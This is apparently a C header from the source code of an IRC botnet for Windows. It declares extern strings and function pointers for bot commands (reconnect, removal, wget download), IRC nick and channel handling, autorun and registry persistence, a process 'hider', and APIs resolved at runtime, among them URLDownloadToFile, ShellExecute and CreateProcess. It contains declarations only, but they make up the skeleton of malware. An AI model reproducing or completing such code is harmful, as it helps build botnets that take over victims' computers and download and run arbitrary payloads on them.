/* ENCRYPTION KEY */
extern char decode_pass[];
extern char other_pass[];
extern char api_pass[];

extern HMODULE 	kernel32_dll, shell32_dll, advapi32_dll, ws2_32_dll, urlmon_dll;

/* CMDS */
extern char cmd__RECONNECT[],cmd__REMOVAL[],cmd__JOIN[],cmd__PART[], cmd__WGET[];

/* IRC */
extern char my_nick[],my_user[],my_privmsg[],my_notice[],my_pass[];
extern char my_join[],my_part[],my_quit[],my_P1N6[],my_P0N6[];
extern char my_4_4_3[],my_3_3_2[];

/* Other Strings */
extern char my_userprofile[];
extern char autorun[];
extern char autorun2[];
extern char regkey_location[];
extern char servicedesc[];
extern char useragent[];
extern char str_reconnect[];
extern char str_removing[];

/* For Nick */
extern char win_unk[];
extern char win_2k[];
extern char win_xp[];
extern char win_2k3[];
extern char win_vista[];
extern char win_2k8[];
extern char win_7[];

/* For Hider */
extern char win_number[];
extern char regedit[];
extern char syslist32[];
extern char t1m3r[];

/* WS2_32 */
extern char WS2_32_[],WSACleanup_[],WSAStartup_[];
extern char closesocket_[],connect_[],gethostbyname_[],htons_[];
extern char recv_[],send_[],socket_[],inet_addr_[],select_[];

/*UrlMon Imports */
extern char urlmon_[],URLDownloadToFile_[];

/* SHELL32 */
extern char shell32_[],ShellExecute_[];

/*ADVAPI*/
extern char advapi32_[],RegCreateKeyEx_[],RegSetValueEx_[],RegCloseKey_[];

/* kernel32.dll Imports*/
extern char kernel32_[],WaitForSingleObject_[],CreateMutex_[];
extern char ExitThread_[],CreateThread_[],GetLocaleInfo_[],GetModuleFileName_[],GetModuleHandle_[],GetDriveType_[];
extern char SetFileAttributes_[],DeleteFile_[],CopyFile_[],GetVersionEx_[],GetLongPathName_[];
extern char CreateFile_[],WriteFile_[],CreateProcess_[],CloseHandle_[],CreateDirectory_[];

extern  HMODULE WS2_32,urlmon,kernel32_dll;

extern FARPROC my_CreateProcess;
extern FARPROC my_WSACleanup, my_WSAStartup, my_closesocket, my_connect, my_gethostbyname, my_htons, my_recv, my_send, my_socket, my_inet_addr, my_select, my_URLDownloadToFile;
extern FARPROC my_ShellExecute, my_RegCreateKeyEx, my_RegSetValueEx, my_RegCloseKey, my_CheckTokenMembership;

void load_apis(void);

